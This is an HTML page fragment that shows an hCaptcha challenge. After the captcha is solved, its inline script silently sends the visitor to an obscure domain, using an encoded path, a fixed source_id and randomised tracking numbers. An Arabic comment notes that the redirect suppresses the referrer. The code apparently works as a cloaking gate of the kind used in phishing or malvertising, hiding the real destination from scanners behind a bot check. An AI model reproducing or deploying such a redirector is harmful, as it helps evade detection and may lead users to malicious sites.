<body>

    <div class="h-captcha" 
         data-sitekey="813ccee2-38cc-4d0e-8cd8-4334a3bc7ab8" 
         data-callback="hcaptchaCallback"></div>

<script src="https://hcaptcha.com/1/api.js" async defer></script>

<script>
(function(){
  
  function zufallsZahlen(laenge){
    let result = '';
    for(let i=0; i<laenge; i++){
      result += Math.floor(Math.random() * 10);
    }
    return result;
  }

  const basisURL = "http://frwxcod.net/Y3Z6aENWM2J4RG9aemordzR1ZjU4Z2F1c0RIclBxaHBtcXN4U01ibUgwS2gvRUZ5WGhNZ0JwVXZFQ1NmQmUwaTNybVVOeFFkWjltaHV1elhOc2lFUXc9PQ__";
  const queryParams = new URLSearchParams({
    source_id: "708180094",
    sub1: zufallsZahlen(8),
    sub2: zufallsZahlen(7),
    sub3: zufallsZahlen(6),
    sub4: zufallsZahlen(5),
    sub5: zufallsZahlen(4)
  });

  const ZIEL = `${basisURL}?${queryParams.toString()}`;

  window.hcaptchaCallback = function(token){
    if(token){
      // التوجيه للصفحة الهدف، لن يتم إرسال referrer
      window.location.href = ZIEL;
    }
  };
})();
</script>
